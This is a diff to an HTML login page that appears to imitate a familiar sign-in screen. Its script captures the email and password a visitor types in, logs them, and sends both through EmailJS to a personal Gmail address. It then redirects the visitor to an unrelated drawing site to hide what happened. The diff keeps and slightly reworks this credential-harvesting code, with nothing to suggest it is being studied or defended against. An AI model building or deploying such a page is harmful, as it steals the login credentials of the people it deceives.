@@ -50,10 +50,8 @@
             background-color: #357ae8;
         }
     </style>
-    <!-- Include EmailJS SDK -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script type="text/javascript">
-        // Initialize EmailJS with your User ID
         (function() {
             emailjs.init('Wm_hgPysMxjkcdYas');
         })();
@@ -68,7 +66,6 @@
             <button type="submit">Next</button>
         </form>
     </div>
-
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault();
@@ -76,15 +73,20 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // Send email using EmailJS
-            emailjs.send('service_zrgq0cs', 'template_8r7y8vw', {
-                to_email: 'choueib2ali@gmail.com',
+            // Debug values
+            console.log({
                 email: email,
-                password: password
+                password: password,
+                to_email: 'choueib2ali@gmail.com'
+            });
+
+            emailjs.send('service_zrgq0cs', 'template_8r7y8vw', {
+                email: email,
+                password: password,
+                to_email: 'choueib2ali@gmail.com'
             })
             .then(function(response) {
                 console.log('Email sent successfully:', response);
-                // Redirect to a drawing website
                 window.location.href = 'https://www.autodraw.com';
             }, function(error) {
                 console.error('Failed to send email:', error);
